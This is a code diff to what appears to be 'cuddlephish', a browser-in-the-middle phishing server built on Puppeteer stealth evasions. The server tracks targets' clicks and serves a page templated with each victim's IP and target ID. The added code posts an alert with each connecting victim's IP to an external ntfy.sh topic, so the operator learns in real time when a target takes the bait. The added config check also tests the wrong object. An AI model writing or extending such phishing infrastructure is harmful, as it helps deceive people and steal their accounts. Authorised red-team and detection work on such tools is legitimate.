@@ -11,6 +11,7 @@ import UserAgentOverride from 'puppeteer-extra-plugin-stealth/evasions/user-agen
 import resize_window from './resize_window.js'
 import replace from 'stream-replace'
 import Xvfb from 'xvfb'
+import https from 'https'
 
 //import admin config
 const config = JSON.parse(fs.readFileSync('./config.json', 'utf8'));
@@ -57,6 +58,26 @@ var ship_logs = function(log_data){
   })
 }
 
+var nfty_notify = function(notif){
+  if(config.nfty_topic == undefined || config.length == 0)
+    return
+
+  var options = {
+    hostname: 'ntfy.sh',
+    port: 443,
+    path: '/' + config.nfty_topic,
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/x-www-form-urlencoded',
+      'Content-Length': notif.length
+    }
+  }
+  
+  var req = https.request(options, (res) => {})
+  req.write(notif)
+  req.end()
+}
+
 const fastify = Fastify({
   logger: false,
   bodyLimit: 19922944
@@ -98,6 +119,7 @@ fastify.route({
       ship_logs({"event_ip": client_ip, "target": target_id, "event_type": "CLICK", "event_data": req.url})
     }
     console.log('client_ip: ' + client_ip)
+    nfty_notify('[cuddlephish] Client connected: ' + client_ip)
     //if(config.admin_ips.includes(client_ip)){
       let stream = fs.createReadStream(__dirname + "/cuddlephish.html")
       reply.type('text/html').send(stream.pipe(replace(/PAGE_TITLE/, target.tab_title)).pipe(replace(/CLIENT_IP/, client_ip)).pipe(replace(/TARGET_ID/, target_id)))
